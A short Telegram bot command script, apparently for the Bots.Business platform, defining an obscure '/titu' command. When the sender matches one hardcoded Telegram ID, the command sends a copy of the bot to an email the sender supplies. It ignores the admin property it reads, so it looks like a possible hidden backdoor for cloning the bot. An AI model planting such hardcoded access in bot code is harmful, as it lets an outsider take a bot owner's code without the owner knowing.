/*CMD
  command: /titu
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
  group: 
CMD*/

var admin = Bot.getProperty("admin")

if (user.telegramid === 6066476514) {
  BBAdmin.installBot({
    email: message,
    bot_id: bot.id
  })

  var text = "<b>✅ Bot sent successfully to " + message + "</b>"

  Api.sendMessage({
    text: text,
    parse_mode: "html"
  })
} else {
  var noText = "<i>⚠️ You are not admin of the bot.</i>"

  Api.sendMessage({
    text: noText,
    parse_mode: "html"
  })
}
